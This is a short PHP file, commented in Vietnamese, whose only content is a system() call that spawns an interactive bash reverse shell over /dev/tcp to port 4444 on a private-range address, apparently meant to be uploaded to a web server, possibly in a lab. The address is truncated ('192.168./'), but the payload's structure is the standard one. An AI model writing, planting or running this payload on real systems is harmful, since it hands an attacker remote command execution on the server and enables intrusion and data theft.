<?php
// Lệnh gọi bash reverse shell về IP máy Windows của bạn
system('/bin/bash -c "bash -i >& /dev/tcp/192.168./4444 0>&1"');
?>
